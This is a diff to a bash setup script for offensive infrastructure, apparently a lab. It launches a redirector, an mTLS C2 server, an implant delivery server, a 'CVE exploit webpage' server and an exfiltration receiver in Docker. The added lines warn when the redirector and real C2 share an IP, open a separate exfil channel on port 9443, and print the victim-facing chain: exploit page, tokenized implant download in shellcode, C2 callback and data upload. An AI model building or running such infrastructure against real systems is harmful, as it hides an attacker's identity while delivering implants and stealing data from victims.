@@ -49,7 +49,7 @@ echo -e "    The victim connects to the redirector IP only — your real IP stay
 echo ""
 
 # Use a more portable way to list interfaces and IPs
-mapfile -t IFACES < <(ip -o -4 addr show | awk '{print $2, $4}' | grep -v '^lo ' | grep -v '127\.')
+mapfile -t IFACES < <(ip -o -4 addr show | grep -v ' secondary ' | awk '{print $2, $4}' | grep -v '^lo ' | grep -v '127\.')
 
 HOSTONLY_IP=""
 HOSTONLY_IFACE=""
@@ -109,6 +109,26 @@ fi
 if ! echo "$HOST_IP" | grep -qE '^([0-9]{1,3}\.){3}[0-9]{1,3}$'; then
     echo -e "${RED}[!] Invalid IP address: '$HOST_IP'. Exiting.${NC}"
     exit 1
+fi
+
+# Warn if redirector IP == real C2 IP — no actual separation occurs
+if [ -n "$HOSTONLY_IP" ] && [ "$HOST_IP" = "$HOSTONLY_IP" ]; then
+    echo ""
+    echo -e "${RED}[!] Redirector IP is the same as your real C2 IP (${HOSTONLY_IP}).${NC}"
+    echo -e "    ${CYAN}This means there is NO IP separation — victim traffic will resolve directly to your C2 machine.${NC}"
+    if [ -n "$SUGGESTED_REDIRECTOR_IP" ]; then
+        echo -e "    ${CYAN}Suggested alias: ${GREEN}${SUGGESTED_REDIRECTOR_IP}${NC}${CYAN} (different address on the same interface)${NC}"
+    fi
+    echo ""
+    read -rp "    Continue with the same IP anyway? (y/N): " SAME_IP_CONFIRM
+    SAME_IP_CONFIRM="${SAME_IP_CONFIRM:-N}"
+    if [[ ! "$SAME_IP_CONFIRM" =~ ^[Yy]$ ]]; then
+        echo -e "${RED}[!] Exiting. Re-run and enter a different redirector IP.${NC}"
+        exit 1
+    fi
+    IP_SEPARATION=0
+else
+    IP_SEPARATION=1
 fi
 
 echo -e "${GREEN}[+] Using redirector IP (C2_HOST_IP): ${HOST_IP}${NC}"
@@ -190,11 +210,11 @@ echo -e "${GREEN}[+] Ready to rebuild.${NC}"
 
 # ── 5. Check for port conflicts ───────────────
 echo ""
-echo -e "${YELLOW}[*] Checking for port conflicts (443, 8443, 8888)...${NC}"
+echo -e "${YELLOW}[*] Checking for port conflicts (443, 8443, 8888, 9443)...${NC}"
 echo -e "    ${CYAN}(Port 443 is now owned by the redirector container — c2-server has no direct host port)${NC}"
 
 CONFLICT=0
-for PORT in 443 8443 8888; do
+for PORT in 443 8443 8888 9443; do
     if ss -tlnp 2>/dev/null | grep -q ":${PORT} "; then
         echo -e "${RED}[!] Port $PORT is already in use.${NC}"
         CONFLICT=1
@@ -225,7 +245,7 @@ echo -e "${YELLOW}[*] Verifying containers started...${NC}"
 sleep 3
 
 ALL_UP=1
-for NAME in redirector c2-server exfil-server; do
+for NAME in redirector c2-server delivery-server exploit-server exfil-receiver; do
     STATUS=$(docker inspect --format='{{.State.Status}}' "$NAME" 2>/dev/null || echo "missing")
     if [ "$STATUS" = "running" ]; then
         echo -e "    ${GREEN}[+] $NAME is running${NC}"
@@ -241,18 +261,30 @@ echo -e "${CYAN}================================================${NC}"
 echo -e "${CYAN}                    Summary                     ${NC}"
 echo -e "${CYAN}================================================${NC}"
 echo ""
+if [ "${IP_SEPARATION:-1}" -eq 1 ]; then
 echo -e "  IP separation:"
 echo -e "    Real C2 machine  → ${CYAN}${HOSTONLY_IP}${NC}  (your Linux host — victim never sees this)"
 echo -e "    Redirector IP    → ${GREEN}${HOST_IP}${NC}  (alias on ${HOSTONLY_IFACE:-vboxnet0} — baked into implant)"
+else
+echo -e "  ${RED}[!] No IP separation — redirector and real C2 are both ${HOST_IP}${NC}"
+echo -e "      Re-run and choose a different redirector IP (e.g. ${SUGGESTED_REDIRECTOR_IP:-<alias IP>}) for proper separation."
+fi
 echo ""
 echo -e "  Traffic path (C2):  victim → ${GREEN}${HOST_IP}:443${NC} (redirector) → ${GREEN}c2-server:443${NC} (backnet only)"
-echo -e "  Exploit webpage  → ${GREEN}http://localhost:8888${NC}"
-echo -e "  Implant delivery → ${GREEN}https://localhost:8443/update/<token>${NC}  (HTTPS, single-use)"
+echo -e "  Traffic path (exfil): implant → ${GREEN}${HOST_IP}:9443${NC} (exfil-receiver) — separate channel"
+echo ""
+echo -e "  Containers:"
+echo -e "    Machine 1 — redirector      ${GREEN}${HOST_IP}:443${NC}   socat relay (frontnet+backnet)"
+echo -e "    Machine 2 — c2-server       backnet only           mTLS C2 listener"
+echo -e "    Machine 3 — delivery-server ${GREEN}${HOST_IP}:8443${NC}  nginx implant download"
+echo -e "    Machine 4 — exploit-server  ${GREEN}${HOST_IP}:8888${NC}  CVE exploit webpage"
+echo -e "    Machine 5 — exfil-receiver  ${GREEN}${HOST_IP}:9443${NC}  HTTPS exfil data sink"
 echo ""
 echo -e "  From Windows VM:"
 echo -e "  Exploit webpage  → ${GREEN}http://${HOST_IP}:8888${NC}"
 echo -e "  Download implant → ${GREEN}https://${HOST_IP}:8443/update/${DOWNLOAD_TOKEN}${NC}  (in shellcode)"
 echo -e "  C2 connects to   → ${GREEN}${HOST_IP}:443${NC}   (redirector alias — not the real C2 IP)"
+echo -e "  Exfil uploads to → ${GREEN}https://${HOST_IP}:9443${NC}  (separate channel, exfil-data/ on host)"
 echo -e "  Real C2 server   → ${CYAN}backnet only — unreachable from victim network${NC}"
 echo ""
 echo -e "  Attach to C2 controller:"
